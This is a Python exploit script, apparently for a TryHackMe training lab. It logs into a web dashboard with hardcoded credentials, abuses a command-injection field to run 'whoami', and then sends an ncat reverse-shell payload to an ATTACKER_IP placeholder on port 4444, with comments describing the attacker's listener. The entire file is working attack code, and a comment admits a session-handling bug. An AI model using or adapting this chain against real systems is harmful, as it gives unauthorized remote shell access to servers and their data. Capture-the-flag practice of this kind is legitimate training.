import requests  # HTTP library — gives us Session, post(), response.text

LOGIN_URL = "http://python.thm/labs/lab4/login.php"       # endpoint that sets auth cookie
EXECUTE_URL = "http://python.thm/labs/lab4/dashboard.php" # endpoint that runs our injected command
USERNAME = "admin"
PASSWORD = "password123"

def authenticate():
    # Session() persists cookies between requests — required because
    # dashboard.php rejects requests that don't carry the login cookie.
    session = requests.Session()

    # POST credentials as form data; server replies with Set-Cookie,
    # which Session automatically stores for later requests.
    response = session.post(LOGIN_URL, data={"username": USERNAME, "password": PASSWORD})

    # Cheap success check — does the returned HTML contain "Welcome"?
    if "Welcome" in response.text:
        print("[+] Authentication successful.")
        return session  # hand the logged-in session back to caller
    return None  # login failed

def execute_command(session, command):
    # The dashboard passes `cmd` straight to a shell → command injection.
    # We just POST it like a normal form field.
    response = session.post(EXECUTE_URL, data={"cmd": command})

    # If server says our session died, try to log in again.
    # NOTE: this only rebinds a local var — caller's session is unchanged (bug).
    if "Session expired" in response.text:
        print("[-] Session expired! Re-authenticating...")
        session = authenticate()

    # Print raw response body — command output is embedded in the page.
    print(f"[+] Output:\n{response.text}")

def get_reverse_shell(session, attacker_ip, attacker_port):
    # f-string inserts IP/port; ncat -e /bin/bash makes the target
    # connect back to us and bind bash to that TCP connection.
    # Requires a listener on our side: nc -lvnp 4444
    payload = f"ncat {attacker_ip} {attacker_port} -e /bin/bash"
    execute_command(session, payload)  # send it through the same injection point

# Main flow: log in → confirm RCE → pop reverse shell
session = authenticate()
if session:
    execute_command(session, "whoami")                 # prove command execution works
    get_reverse_shell(session, "ATTACKER_IP", 4444)    # open shell to our listener